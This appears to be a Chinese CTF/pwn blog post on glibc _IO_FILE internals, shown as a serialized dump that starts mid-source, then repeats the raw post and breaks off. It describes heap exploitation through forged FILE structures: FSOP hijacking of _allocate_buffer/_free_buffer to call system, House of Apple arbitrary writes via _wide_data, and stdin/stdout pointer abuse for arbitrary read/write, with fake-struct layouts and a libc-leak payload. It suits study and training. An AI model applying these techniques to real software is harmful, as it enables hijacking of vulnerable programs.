(new_buf, old_buf, old_blen);\n          (*((_IO_strfile *) fp)->_s._free_buffer) (old_buf);\n          /* Make sure _IO_setb won't try to delete _IO_buf_base. */\n          fp->_IO_buf_base = NULL;\n        }\n      memset (new_buf + old_blen, '\\0', new_size - old_blen);\n\n      _IO_setb (fp, new_buf, new_buf + new_size, 1);\n      fp->_IO_read_base = new_buf + (fp->_IO_read_base - old_buf);\n      fp->_IO_read_ptr = new_buf + (fp->_IO_read_ptr - old_buf);\n      fp->_IO_read_end = new_buf + (fp->_IO_read_end - old_buf);\n      fp->_IO_write_ptr = new_buf + (fp->_IO_write_ptr - old_buf);\n\n      fp->_IO_write_base = new_buf;\n      fp->_IO_write_end = fp->_IO_buf_end;\n    }\n    }\n\n  if (!flush_only)\n    *fp->_IO_write_ptr++ = (unsigned char) c;\n  if (fp->_IO_write_ptr > fp->_IO_read_end)\n    fp->_IO_read_end = fp->_IO_write_ptr;\n  return c;\n}\nlibc_hidden_def (_IO_str_overflow)\n```\n\n利用下面语句可以劫持程序流程：\n\n```c\nnew_buf= (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size);\n```\n\n思路是绕过前面的检查，并将`fp->_s._allocate_buffer`修改为`system`,将`new_size`修改为`\"/bin/sh\"`的地址（也可直接改为one_gadget）\n\n具体构造：\n\n1. `fp->_flags & _IO_NO_WRITES`为假\n2. `(pos = fp->_IO_write_ptr - fp->_IO_write_base) >= ((fp->_IO_buf_end - fp->_IO_buf_base) + flush_only(1))`\n3. `fp->_flags & _IO_USER_BUF(0x01)`为假\n4. `2*(fp->_IO_buf_end - fp->_IO_buf_base) + 100 `不能为负数\n5. `new_size = 2 * (fp->_IO_buf_end - fp->_IO_buf_base) + 100`; 应当指向/bin/sh字符串对应的地址\n6. `fp+0xe0`（`_allocate_buffer`）指向system地址\n\n当然也要绕过 `_IO_flush_all_lockp`的一些条件\n\n1. `fp->_mode<=0`\n2. `fp->_IO_write_ptr > fp->_IO_write_base`\n\n```c\n._chain => chunk_addr\nchunk_addr\n{\n  file = {\n    _flags = 0x0,\n    _IO_read_ptr = 0x0,\n    _IO_read_end = 0x0,\n    _IO_read_base = 0x0,\n    _IO_write_base = 0x0,\n    _IO_write_ptr = 0x1,\n    _IO_write_end = 0x0,\n    _IO_buf_base = 0x0,\n    _IO_buf_end = (bin_sh_addr - 100) // 2,\n      ...\n      _mode = 0x0, //一般不用特意设置\n      _unused2 = '\\000' <repeats 19 times>\n  },\n  vtable = _IO_str_jumps //chunk_addr + 0xd8 ~ +0xe0(glibc2.24之前可以)\n}\n+0xe0 ~ +0xe8 : system_addr / one_gadget //fp->_s._allocate_buffer\n```\n\n------\n\n在`_IO_str_jumps`中的`_IO_str_finish`也可以利用。\n\n```c\nvoid\n_IO_str_finish (_IO_FILE *fp, int dummy)\n{\n  if (fp->_IO_buf_base && !(fp->_flags & _IO_USER_BUF))\n    (((_IO_strfile *) fp)->_s._free_buffer) (fp->_IO_buf_base);  //[fp+0xe8]\n  fp->_IO_buf_base = NULL;\n\n  _IO_default_finish (fp, 0);\n}\n```\n\n同样也是对其中函数指针的利用\n\n```c\n(((_IO_strfile *) fp)->_s._free_buffer) (fp->_IO_buf_base);  //[fp+0xe8]\n```\n\n绕过条件：\n\n1. _IO_buf_base 不为空\n2. _flags & _IO_USER_BUF(0x01) 为假，即flag字段不包含IO_USER_BUF\n\n现在要让程序执行 `_IO_str_finish` ，`fclose(fp)` 是一条路，但似乎有局限。还是回到异常处理的方法，在 `_IO_flush_all_lockp` 函数中是通过 `_IO_OVERFLOW` 执行的 `__GI__IO_str_overflow`，而 `_IO_OVERFLOW` 是根据 `__overflow` 相对于 `_IO_str_jumps` vtable 的偏移找到具体函数的。所以如果我们伪造传递给 `_IO_OVERFLOW(fp)` 的 fp 是 vtable 的地址减去 0x8，那么根据偏移，程序将找到 `_IO_str_finish` 并执行。\n\n也就是说，如果设置的vtable是`_IO_str_jumps-0x8`，那么在`vtable+0x18`的位置就是 `_IO_str_finish`（原本应该是 `_IO_str_overflow`），这样就可以通过 `_IO_flush_all_lockp`执行到 `_IO_str_finish`，而且由于这个vtable在合法范围内，因此能过检测。\n\n不过我们也要绕过 `_IO_flush_all_lockp`的一些条件\n\n1. `fp->_mode<=0`\n2. `fp->_IO_write_ptr > fp->_IO_write_base`\n\n构造如下：\n\n```c\n._chain => chunk_addr\nchunk_addr\n{\n  file = {\n    _flags = 0x0,\n    _IO_read_ptr = 0x0,\n    _IO_read_end = 0x0,\n    _IO_read_base = 0x0,\n    _IO_write_base = 0x0,\n    _IO_write_ptr = 0x1,\n    _IO_write_end = 0x0,\n    _IO_buf_base = bin_sh_addr,\n      ...\n      _mode = 0x0, //一般不用特意设置\n      _unused2 = '\\000' <repeats 19 times>\n  },\n  vtable = _IO_str_jumps-8 //chunk_addr + 0xd8 ~ +0xe0 (2.24之前可以)\n}\n+0xe0 ~ +0xe8 : 0x0\n+0xe8 ~ +0xf0 : system_addr / one_gadget //fp->_s._free_buffer\n```\n\n而在`libc-2.28`及以后，由于不再使用偏移找`_s._allocate_buffer`和`_s._free_buffer`，而是直接用`malloc`和`free`代替，所以`FSOP`也失效了。\n\n### _IO_wide_data（House of Apple）\n\n`struct _IO_wide_data *_wide_data`在`_IO_FILE`中的偏移为`0xa0`\n\n`_IO_wide_data`的结构如下：\n\n```c\nstruct _IO_wide_data\n{\n  wchar_t *_IO_read_ptr;    /* Current read pointer */ \t\t\t//0x00\n  wchar_t *_IO_read_end;    /* End of get area. */\t\t\t\t//0x08\n  wchar_t *_IO_read_base;    /* Start of putback+get area. */\t //0x10\n  wchar_t *_IO_write_base;    /* Start of put area. */\t\t\t//0x18\n  wchar_t *_IO_write_ptr;    /* Current put pointer. */\t\t\t//0x20\n  wchar_t *_IO_write_end;    /* End of put area. */\t\t\t\t//0x28\n  wchar_t *_IO_buf_base;    /* Start of reserve area. */\t\t//0x30\n  wchar_t *_IO_buf_end;        /* End of reserve area. */\t\t//0x38\n  /* The following fields are used to support backing up and undo. */\n  wchar_t *_IO_save_base;    /* Pointer to start of non-current get area. */\n  wchar_t *_IO_backup_base;    /* Pointer to first valid character of\n                   backup area */\n  wchar_t *_IO_save_end;    /* Pointer to end of non-current get area. */\n \n  __mbstate_t _IO_state;\n  __mbstate_t _IO_last_state;\n  struct _IO_codecvt _codecvt;\n  wchar_t _shortbuf[1];\n  const struct _IO_jump_t *_wide_vtable; //_IO_wide_data+0xe0\n};\n```\n\n伪造`_wide_data`变量，通过`_IO_wstrn_overflow`可以将已知地址空间上的某些值修改为一个已知值。\n\n```c\nstatic wint_t _IO_wstrn_overflow (FILE *fp, wint_t c)\n{\n  /* When we come to here this means the user supplied buffer is\n     filled.  But since we must return the number of characters which\n     would have been written in total we must provide a buffer for\n     further use.  We can do this by writing on and on in the overflow\n     buffer in the _IO_wstrnfile structure.  */\n  _IO_wstrnfile *snf = (_IO_wstrnfile *) fp;\n \n  if (fp->_wide_data->_IO_buf_base != snf->overflow_buf)\n    {\n      _IO_wsetb (fp, snf->overflow_buf,\n         snf->overflow_buf + (sizeof (snf->overflow_buf)\n                      / sizeof (wchar_t)), 0);\n \n      fp->_wide_data->_IO_write_base = snf->overflow_buf;\n      fp->_wide_data->_IO_read_base = snf->overflow_buf;\n      fp->_wide_data->_IO_read_ptr = snf->overflow_buf;\n      fp->_wide_data->_IO_read_end = (snf->overflow_buf\n                      + (sizeof (snf->overflow_buf)\n                     / sizeof (wchar_t))); //overflow_buf+偏移\n    }\n \n  fp->_wide_data->_IO_write_ptr = snf->overflow_buf;\n  fp->_wide_data->_IO_write_end = snf->overflow_buf;\n \n  /* Since we are not really interested in storing the characters\n     which do not fit in the buffer we simply ignore it.  */\n  return c;\n}\n```\n\n`_IO_wstrn_overflow`首先将`fp`强制转化为`_IO_wstrnfile *`指针，然后判断`fp->_wide_data->_IO_buf_base != snf->overflow_buf`是否成立（一般肯定是成立的），如果成立则会对`fp->_wide_data`的`_IO_write_base`、`_IO_read_base`、`_IO_read_ptr`和`_IO_read_end`赋值为`snf->overflow_buf`或者与该地址一定范围内偏移的值；最后对`fp->_wide_data`的`_IO_write_ptr`和`_IO_write_end`赋值。\n\n也就是说，只要控制了`fp->_wide_data`，就可以控制从`fp->_wide_data`开始一定范围内的内存的值，也就等同于**任意地址写已知地址**。\n\n这里有时候需要绕过`_IO_wsetb`函数里面的`free`：\n\n```c\nvoid _IO_wsetb (FILE *f, wchar_t *b, wchar_t *eb, int a)\n{\n  if (f->_wide_data->_IO_buf_base && !(f->_flags2 & _IO_FLAGS2_USER_WBUF))\n    free (f->_wide_data->_IO_buf_base); // 其不为0的时候不要执行到这里\n  f->_wide_data->_IO_buf_base = b; //overflow_buf\n  f->_wide_data->_IO_buf_end = eb; //overflow_buf+偏移\n  if (a)\n    f->_flags2 &= ~_IO_FLAGS2_USER_WBUF;\n  else\n    f->_flags2 |= _IO_FLAGS2_USER_WBUF;\n}\n```\n\n这样也能写入到`f->_wide_data->_IO_buf_base`和`f->_wide_data->_IO_buf_end`\n\n`_IO_wstrnfile`涉及到的结构体如下：\n\n```c\nstruct _IO_str_fields\n{\n  _IO_alloc_type _allocate_buffer_unused;\n  _IO_free_type _free_buffer_unused;\n};\n \nstruct _IO_streambuf\n{\n  FILE _f;\n  const struct _IO_jump_t *vtable;\n};\n \ntypedef struct _IO_strfile_\n{\n  struct _IO_streambuf _sbf;\n  struct _IO_str_fields _s;\n} _IO_strfile;\n \ntypedef struct\n{\n  _IO_strfile f;\n  /* This is used for the characters which do not fit in the buffer\n     provided by the user.  */\n  char overflow_buf[64];\n} _IO_strnfile;\n \n \ntypedef struct\n{\n  _IO_strfile f;\n  /* This is used for the characters which do not fit in the buffer\n     provided by the user.  */\n  wchar_t overflow_buf[64]; // overflow_buf相对于_IO_FILE结构体的偏移为0xf0，在vtable后面。\n} _IO_wstrnfile;\n```\n\n因此如果能在堆上伪造一个`_IO_FILE`结构体，将其`vtable`替换为`_IO_wstrn_jumps`，伪造`_wide_data`并覆盖，并伪造其他字段绕过检测调用`_IO_OVERFLOW`。`exit`函数则会一路调用到`_IO_wstrn_overflow`函数，并将`fake _wide_data`至`fake _wide_data+0x38`的地址区域的内容都替换为`fake_IO_FILE的overflow_buf+0xf0`或者`fake_IO_FILE的overflow_buf + 0x1f0`。\n\n对`_wide_data`的利用是House of Apple的原理。\n\n### IO_FILE中file的读写指针利用\n\n由于伪造的vtable常常都不在合法范围之内，因此很难再利用vtable，不过我们还可以利用file。\n\nIO_FILE结构中包含了关于文件的基本信息，其中就有与文件读写相关的字段，fwrite、fread等操作就需要利用这些信息。\n\n```c\n  char* _IO_read_ptr;   /* Current read pointer */\n  char* _IO_read_end;   /* End of get area. */\n  char* _IO_read_base;  /* Start of putback+get area. */\n  char* _IO_write_base; /* Start of put area. */\n  char* _IO_write_ptr;  /* Current put pointer. */\n  char* _IO_write_end;  /* End of put area. */\n  char* _IO_buf_base;   /* Start of reserve area. */\n  char* _IO_buf_end;    /* End of reserve area. */\n```\n\n如果我们能控制以上字段，那就可以控制缓冲区的读写范围，实现任意读写。即使没有打开文件也没有关系，程序本身会创建stdin、stdout、stderr，控制这两个字段后通过sprintf、printf等函数一样可以利用。\n\n#### 利用stdin进行任意写\n\n`scanf`，`fread`，`gets`等读入走`IO`指针（`read`不走），最后都会调用vtable中的`_xsgetn()`。\n\n```c\n_IO_size_t _IO_file_xsgetn (_IO_FILE *fp, void *data, _IO_size_t n)\n{\n ...\n  if (fp->_IO_buf_base == NULL)\n    {\n      ...\n      //输入缓冲区为空则初始化输入缓冲区\n    }\n  while (want > 0) //还需要get的字节数\n    {\n      have = fp->_IO_read_end - fp->_IO_read_ptr;\n      if (have > 0)\n        {\n          ...\n          //memcpy\n \n        }\n      if (fp->_IO_buf_base\n          && want < (size_t) (fp->_IO_buf_end - fp->_IO_buf_base))\n        {\n          if (__underflow (fp) == EOF)  // 调用__underflow读入数据\n          ...\n        }\n      ...\n  return n - want;\n}\n\nint _IO_new_file_underflow (_IO_FILE *fp)\n{\n  _IO_ssize_t count;\n  ...\n  // 会检查_flags是否包含_IO_NO_READS标志，包含则直接返回。\n  // 标志的定义是#define _IO_NO_READS 4，因此_flags不能包含4。\n  if (fp->_flags & _IO_NO_READS)\n    {\n      fp->_flags |= _IO_ERR_SEEN;\n      __set_errno (EBADF);\n      return EOF;\n    }\n  // 如果输入缓冲区里存在数据，则直接返回\n  if (fp->_IO_read_ptr < fp->_IO_read_end)\n    return *(unsigned char *) fp->_IO_read_ptr;\n  ...\n  // 调用_IO_SYSREAD函数最终执行系统调用读取数据\n  count = _IO_SYSREAD (fp, fp->_IO_buf_base,\n               fp->_IO_buf_end - fp->_IO_buf_base);\n  ...\n}\nlibc_hidden_ver (_IO_new_file_underflow, _IO_file_underflow)\n```\n\n如果`_IO_buf_base`为空，则会初始化缓冲区。\n\n之后会判断`_IO_read_ptr`对应的空间是否有剩余，如果有则**直接复制到目的地址(传入的data)**。\n\n如果`_IO_read_ptr`中的内容没有或不够，则调用`__underflow`函数**执行系统调用读取数据**（`SYS_read`）到从`_IO_buf_base`开始到`_IO_buf_end`的位置，默认`0x400`字节。\n\n此时若实际读入了`n`个字节的数据，则`_IO_read_end = _IO_buf_base + n`（即`_IO_read_end`指向实际读入的最后一个字节的数据），之后再将`_IO_read_ptr`中的数据复制到目的地址(传入的data)。\n\n综上，为了做到**任意写**，满足如下条件，即可进行利用：\n\n1. 设置`_IO_read_end`等于`_IO_read_ptr`（使得`_IO_read_ptr`没有剩余数据，从而可以通过`SYS_read`读入数据）。\n2. 设置`_flag &~ _IO_NO_READS`即`_flag &~ 0x4`（一般不用特意设置）。\n3.  设置`_fileno`为`0`（一般不用特意设置）。\n4.  设置`_IO_buf_base`为`write_start`，`_IO_ buf_end`为`write_end`（我们目标写的起始地址是`write_start`，写结束地址为`write_end`），且使得`_IO_buf_end-_IO_buf_base`大于要写入的数据长度。\n\n#### 利用stdout进行任意读/写\n\n`printf`，`fwrite`，`puts`等输出走`IO`指针（`write`不走），最后会调用vtable中的`_xsputn()`\n\n```c\nIO_size_t _IO_new_file_xsputn (_IO_FILE *f, const void *data, _IO_size_t n)\n{\n  const char *s = (const char *) data;\n  _IO_size_t to_do = n;\n  int must_flush = 0;\n  _IO_size_t count = 0;\n  if (n <= 0)\n    return 0;\n  if ((f->_flags & _IO_LINE_BUF) && (f->_flags & _IO_CURRENTLY_PUTTING))\n    { //如果是行缓冲模式...\n      count = f->_IO_buf_end - f->_IO_write_ptr; //判断输出缓冲区还有多少空间\n      if (count >= n)\n        {\n          const char *p;\n          for (p = s + n; p > s; )\n            {\n              if (*--p == '\\n') //最后一个换行符\\n为截断符，且需要刷新输出缓冲区\n                {\n                  count = p - s + 1;\n                  must_flush = 1; //标志为真：需要刷新输出缓冲区\n                  break;\n                }\n            }\n        }\n    }\n  else if (f->_IO_write_end > f->_IO_write_ptr) //判断输出缓冲区还有多少空间（全缓冲模式）\n    count = f->_IO_write_end - f->_IO_write_ptr;\n  if (count > 0) //输出缓冲区余下空间>0\n    {\n      //如果输出缓冲区有空间，则先把数据拷贝至输出缓冲区\n      if (count > to_do)\n      \tcount = to_do;\n      f->_IO_write_ptr = __mempcpy (f->_IO_write_ptr, s, count); //全部复制到write_ptr\n      \t\t\t\t\t\t\t\t\t\t\t\t\t\t//控制write_ptr实现任意写\n      s += count;\n      to_do -= count;\n    }\n  if (to_do + must_flush > 0) //任意读的利用\n    {\n      _IO_size_t block_size, do_write;\n      if (_IO_OVERFLOW (f, EOF) == EOF) //调用_IO_OVERFLOW\n        return to_do == 0 ? EOF : n - to_do;\n      block_size = f->_IO_buf_end - f->_IO_buf_base;\n      do_write = to_do - (block_size >= 128 ? to_do % block_size : 0);\n      if (do_write)\n        {\n          count = new_do_write (f, s, do_write);\n          to_do -= count;\n          if (count < do_write)\n            return n - to_do;\n        }\n      if (to_do)\n        to_do -= _IO_default_xsputn (f, s+do_write, to_do);\n    }\n  return n - to_do;\n}\nlibc_hidden_ver (_IO_new_file_xsputn, _IO_file_xsputn)\n```\n\n在`_IO_2_1_stdout_`中，`_IO_buf_base`和`_IO_buf_end`为输出缓冲区起始位置（默认大小为`0x400`），在输出的过程中，会先将需要输出的数据从目标地址拷贝到输出缓冲区，再从输出缓冲区输出给用户。\n缓冲区建立函数`_IO_doallocbuf`会建立输出缓冲区，并把基地址保存在`_IO_buf_base`中，结束地址保存在`_IO_buf_end`中，在建立了输出缓冲区后，会将基址赋值给`_IO_write_base`。\n\n若是设置的是**全缓冲模式**`_IO_FULL_BUF`（一次接收所有输入），则会将结束地址给`_IO_write_end`，若是设置的是**行缓冲模式**`_IO_LINE_BUF`（一次接收一行），则`_IO_write_end`中存的是`_IO_buf_base`。\n\n此外，`_IO_write_ptr`表示输出缓冲区中已经使用到的地址，`_IO_write_base`到`_IO_write_ptr`之间的空间是已经使用的缓冲区，`_IO_write_ptr`到`_IO_write_end`之间为剩余的输出缓冲区。\n\n（1）任意写\n\n在行缓冲模式下，判断输出缓冲区还有多少空间，用的是`count = f->_IO_buf_end - f->_IO_write_ptr`，而在全缓冲模式下，用的是`count = f->_IO_write_end - f->_IO_write_ptr`。\n\n如果还有空间剩余，则会将要输出的`count`长度的数据复制到`_IO_write_ptr`，因此可通过这一点来实现任意地址写的功能。\n**利用方式**：只需将`_IO_write_ptr`指向`write_start`，`_IO_write_end`指向`write_end`即可。\n这里需要注意的是，有宏定义`#define _IO_LINE_BUF 0x0200`，`flag & _IO_LINE_BUF`为真，则表示`flag`中包含了`_IO_LINE_BUF`标识，即开启了行缓冲模式（可用`setvbuf(stdout,0,_IOLBF,1024)`开启），若要构造`flag`包含`_IO_LINE_BUF`标识，则`flag |= 0x200`即可。\n\n（2）任意读\n\n任意读利用了` if (to_do + must_flush > 0) `成立分支的部分\n\n`to_do`表明还有多少字节没有读入，因此一定是非负数。`must_flush`表明输出缓冲区是否需要刷新，当在行缓冲模式下检测到有换行符`\\n`的时候被赋值为1，因此当输出内容中有`\\n`且为**行缓冲模式**时就会执行该分支的内容，如用`puts`函数输出就一定会执行。\n若`to_do`大于`0`，也就是还有字符没有读入，也会执行该分支中的内容。因此，当 **输出缓冲区未建立** 或者 **输出缓冲区没有剩余空间** 或者 **输出缓冲区剩余的空间不够一次性将目标地址中的数据完全复制过来** 的时候，也会执行该`if`分支中的内容。\n`if`分支中主要调用了`_IO_OVERFLOW()`来刷新输出缓冲区，而在此过程中会调用`_IO_do_write()`输出我们想要的数据。\n\n```c\nint _IO_new_file_overflow (_IO_FILE *f, int ch)\n{\n  // 判断标志位是否包含_IO_NO_WRITES => _flags需要不包含_IO_NO_WRITES\n  if (f->_flags & _IO_NO_WRITES)\n    {\n      f->_flags |= _IO_ERR_SEEN;\n      __set_errno (EBADF);\n      return EOF;\n    }\n  // 判断输出缓冲区是否为空 以及 是否不包含_IO_CURRENTLY_PUTTING标志位\n  // 为了不执行该if分支以免出错，最好定义 _flags 包含 _IO_CURRENTLY_PUTTING\n  if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0 || f->_IO_write_base == NULL)\n    {\n      ...\n    }\n  // 调用_IO_do_write 输出 输出缓冲区\n  // 从_IO_write_base开始，输出(_IO_write_ptr - f->_IO_write_base)个字节的数据\n  if (ch == EOF)\n    return _IO_do_write (f, f->_IO_write_base,\n             f->_IO_write_ptr - f->_IO_write_base);\n  return (unsigned char) ch;\n}\nlibc_hidden_ver (_IO_new_file_overflow, _IO_file_overflow)\n    \nstatic _IO_size_t new_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)\n{\n  ...\n  _IO_size_t count;\n  // 为了不执行else if分支中的内容以产生错误，可构造_flags包含_IO_IS_APPENDING 或 设置_IO_read_end等于_IO_write_base\n  if (fp->_flags & _IO_IS_APPENDING)\n    fp->_offset = _IO_pos_BAD;\n  else if (fp->_IO_read_end != fp->_IO_write_base)\n    {\n      _IO_off64_t new_pos\n    = _IO_SYSSEEK (fp, fp->_IO_write_base - fp->_IO_read_end, 1);\n      if (new_pos == _IO_pos_BAD)\n    return 0;\n      fp->_offset = new_pos;\n    }\n  // 调用函数输出输出缓冲区\n  count = _IO_SYSWRITE (fp, data, to_do);\n  ...\n  return count;\n}\n```\n\n综上，为了做到**任意读**，需要满足如下条件：\n(1) 设置`_flag &~ _IO_NO_WRITES`，即`_flag &~ 0x8`；\n(2) 设置`_flag & _IO_CURRENTLY_PUTTING`，即`_flag | 0x800`；\n(3) 设置`_fileno`为`1`(stdout)；\n(4) 设置`_IO_write_base`指向想要泄露的地方，`_IO_write_ptr`指向泄露结束的地址；\n(5) 设置`_IO_read_end`等于`_IO_write_base` 或 设置`_flag & _IO_IS_APPENDING`即，`_flag | 0x1000`。\n此外，有一个**大前提**：需要调用`_IO_OVERFLOW()`才行，因此**需使得需要输出的内容中含有`\\n`换行符 或 设置`_IO_write_end`等于`_IO_write_ptr`**（输出缓冲区无剩余空间）等。\n一般来说，经常利用`puts`函数加上述`stdout`任意读的方式泄露`libc`。\n\nflag的构造如下：\n\n```c\n_flags = 0xfbad0000 \n_flags & = ~_IO_NO_WRITES // _flags = 0xfbad0000\n_flags | = _IO_CURRENTLY_PUTTING // _flags = 0xfbad0800\n_flags | = _IO_IS_APPENDING // _flags = 0xfbad1800\n```\n\n例如在`libc-2.27`下，构造`fakefile = p64(0xfbad1800) + p64(0)*3 + b'\\x58'`（`\\x58`覆盖`write_base`的低位），泄露出的第一个地址即为`_IO_file_jumps`的地址。\n","source":"_posts/IO_FILE.md","raw":"---\ntitle: IO_FILE\ndate: 2023-01-02 00:01:40\ncategories: \n- pwn\ntags: \n- pwn\n- IO_FILE \n---\nIO_FILE是linux中的文件流，在堆利用无法使用hook来get shell时，常常通过IO_FILE的方式控制程序流来get shell。\n<!-- more -->\n\n在linux中，一切都被当作文件处理，那自然就包括了IO，IO_FILE就是用来描述IO的文件结构体。所有的文件流文件都是_IO_FILE_plus的结构。\n\n```c\nstruct _IO_FILE_plus\n{\n    _IO_FILE file; //完整的结构体内容\n    const struct _IO_jump_t* vtable; //仅有一个指针\n}\n```\n\n其中file是文件流，是linux中用于描述文件的结构，包含文件的关键数据，vtable则是一个**虚表（虚拟函数表）**，保存的是各种操作函数的指针，在对文件流进行操作时，实际是调用该虚表中的函数。\n\n为了管理所有的IO流，存在一个**全局变量**\\_IO_list_all的指针，这个指针指向**IO_2_1_stderr** 这个IO_FILE结构体，_IO_FILE结构体中会通过指针形成链表连接在一起。\n\n```c\nextern struct _IO_FILE_plus* _IO_list_all; \n```\n\n在使用fopen函数打开文件时，会创建一个对应该文件的\\_IO_FILE_plus结构体，并将其存放在**堆**中，其**返回值就是其_IO_FILE结构file**。\n\n除了\\_IO_2_1_stderr\\_（stderr）之外，程序原本还有输入输出流，因此堆中还有\\_IO_2_1_stdout\\_和\\_IO_2_1_stdin\\_。在链表中stderr->stdout->stdin。新加入的IO_FILE会从头（_IO_list_all）处链入链表，因此stdin实际上是链表的最后一个，所以他们的对应文件描述符0(stdin),1(stdout),2(stderr)也是有道理的。\n\n因为_IO_FILE存放在堆中（stderr、stdout、stdin除外，他们在libc中），因此许多对IO_FILE的利用都与堆相关。\n\n完整的`_IO_FILE_plus`结构如下：\n\n```c\n_IO_FILE_plus = {\n\t'amd64':{\n\t\t0x0:'_flags',\n\t\t0x8:'_IO_read_ptr',\n\t\t0x10:'_IO_read_end',\n\t\t0x18:'_IO_read_base',\n\t\t0x20:'_IO_write_base',\n\t\t0x28:'_IO_write_ptr',\n\t\t0x30:'_IO_write_end',\n\t\t0x38:'_IO_buf_base',\n\t\t0x40:'_IO_buf_end',\n\t\t0x48:'_IO_save_base',\n\t\t0x50:'_IO_backup_base',\n\t\t0x58:'_IO_save_end',\n\t\t0x60:'_markers',\n\t\t0x68:'_chain',\n\t\t0x70:'_fileno',\n\t\t0x74:'_flags2',\n\t\t0x78:'_old_offset',\n\t\t0x80:'_cur_column',\n\t\t0x82:'_vtable_offset',\n\t\t0x83:'_shortbuf',\n\t\t0x88:'_lock',\n\t\t0x90:'_offset',\n\t\t0x98:'_codecvt',\n\t\t0xa0:'_wide_data',\n\t\t0xa8:'_freeres_list',\n\t\t0xb0:'_freeres_buf',\n\t\t0xb8:'__pad5',\n\t\t0xc0:'_mode',\n\t\t0xc4:'_unused2',\n\t\t0xd8:'vtable'\n\t}\n}\n```\n\n\n\n## _IO_FILE\n\n其中_IO_FILE的结构如下：\n\n```c\nstruct _IO_FILE {\n  int _flags; /* low-order is flags.*/\n#define _IO_file_flags _flags\n\n  char* _IO_read_ptr;   /* Current read pointer */\n  char* _IO_read_end;   /* End of get area. */\n  char* _IO_read_base;  /* Start of putback+get area. */\n  char* _IO_write_base; /* Start of put area. */\n  char* _IO_write_ptr;  /* Current put pointer. */\n  char* _IO_write_end;  /* End of put area. */\n  char* _IO_buf_base;   /* Start of reserve area. */\n  char* _IO_buf_end;    /* End of reserve area. */\n\n  char *_IO_save_base; \n  char *_IO_backup_base; \n  char *_IO_save_end; \n  struct _IO_marker *_markers;\n\n  struct _IO_FILE *_chain;/*指向下一个file结构*/\n\n  int _fileno;\n#if 0\n  int _blksize;\n#else\n  int _flags2;\n#endif\n  _IO_off_t _old_offset; \n\n[...]\n  _IO_lock_t *_lock;\n  #ifdef _IO_USE_OLD_IO_FILE //开始宏判断（这段判断结果为否，所以没有定义_IO_FILE_complete，下面还是_IO_FILE）\n};\n\nstruct _IO_FILE_complete\n{\n  struct _IO_FILE _file;\n#endif //结束宏判断\n[...] \nint _mode;\n  /* Make sure we don't get into trouble again.  */\n  char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];\n#endif\n};\n```\n\n可以看到_IO_FILE结构中存放着文件的基本信息，比如说：读/写的起始和结束位置，当前读/写位置，缓冲区的起始和结束位置，保存位置等。\n\n比较关键的还有一个\\_chain，它指向下一个\\_IO_FILE结构，通过该指针将所有_IO_FILE连成一个链表。\n\n```c\nstruct _IO_FILE *_chain;/*指向下一个file结构*/\n```\n\n## _IO_JUMP_t虚表\n\n### 虚表和虚函数\n\n虚表和虚函数在C语言中不常见，甚至不像C++那样有virtual关键字实现虚函数。实际上虚表和虚函数是用于实现**多态**这种特性的，而C语言本身是面向过程的，因此没有virtual也在情理之中。\n\n但实际上，C语言是可以做到面向对象的，通过struct结构体可以实现类似类的结构，**结构体中的数据就相当于是类中的成员变量，结构体中的函数指针就相当于是类中的成员函数**。\n\n但是这种方法本身也有些弊端，每个结构体实例都会包含所有的函数指针，而每个函数指针都要占据空间（即使其没有被使用）。因此在C语言编程中很少会有将函数指针写在结构体内的，而是在结构体外写一个函数，通过参数传入结构体的实例来对结构体进行操作。实际上在C++中，如果没有virtual关键字的话，编译器也会采取类似的方法对成员函数进行处理。\n\n但如果要实现**多态**的话，就不能用这种节省内存的方法了。对于C语言而言，就是将函数指针放在结构体中，每一个结构体实例通过该函数指针指向自己定义的函数，并且通过该函数指针调用它，这样的函数就可以说是虚函数。\n\n那虚表是什么呢？毕竟虚函数的数量可能不止一个，并且和一般的函数有些不一样（存在其他同名函数），为了方便对每个实例的虚函数进行管理，就有了虚表这种结构。**虚表实际上就是虚函数的表，用来管理虚函数**，虚表是从属于该类的，会通过一个指针指向该虚表。\n\n### _IO_JUMP_T结构\n\n_IO_jump_t结构如下:\n\n```c\n#define JUMP_FIELD(TYPE, NAME) TYPE NAME\nstruct _IO_jump_t\n{\n    JUMP_FIELD(size_t, __dummy);//0\n    JUMP_FIELD(size_t, __dummy2);//1 DUMMY\n    JUMP_FIELD(_IO_finish_t, __finish);//2 finish\n    JUMP_FIELD(_IO_overflow_t, __overflow);//3 overflow\n    JUMP_FIELD(_IO_underflow_t, __underflow);//4 underflow\n    JUMP_FIELD(_IO_underflow_t, __uflow);//5 uflow\n    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);//6 pbackfail \n    /* showmany */\n    JUMP_FIELD(_IO_xsputn_t, __xsputn);//7 xsputn\n    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);//8 xsgetn\n    JUMP_FIELD(_IO_seekoff_t, __seekoff);//9 seekoff\n    JUMP_FIELD(_IO_seekpos_t, __seekpos);//10 seekpos\n    JUMP_FIELD(_IO_setbuf_t, __setbuf);//11 setbuf\n    JUMP_FIELD(_IO_sync_t, __sync);//12 sync\n    JUMP_FIELD(_IO_doallocate_t, __doallocate);//13 doallocate\n    JUMP_FIELD(_IO_read_t, __read);//14 read\n    JUMP_FIELD(_IO_write_t, __write);//15 write\n    JUMP_FIELD(_IO_seek_t, __seek);//16 seek\n    JUMP_FIELD(_IO_close_t, __close);//17 close\n    JUMP_FIELD(_IO_stat_t, __stat);//18 stat\n    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);//19 showmanyc\n    JUMP_FIELD(_IO_imbue_t, __imbue);//20 imbue\n#if 0\n    get_column;\n    set_column;\n#endif\n};\n```\n\n对文件操作的函数都会调用该文件流中vtable中的函数\n\n### 部分文件操作函数简介\n\n#### fread\n\nfread 是标准 IO 库函数，作用是从文件流中读数据，函数原型如下:\n\n```c\nsize_t fread ( void *buffer, size_t size, size_t count, FILE *stream) ;\n```\n\nfread 的代码位于 /libio/iofread.c 中，函数名为\\_IO_fread，但真正的功能实现在子函数\\_IO_sgetn 中。在\\_IO_sgetn 函数中会取出vtable中的\\_IO_XSGETN并调用。\n\n#### fwrite\n\nfwrite 也是标准 IO 库函数，作用是向文件流写入数据，函数原型如下：\n\n```c\nsize_t fwrite(const void* buffer, size_t size, size_t count, FILE* stream);\n```\n\nfwrite 的代码位于 / libio/iofwrite.c 中，函数名为\\_IO_fwrite。 在\\_IO_fwrite 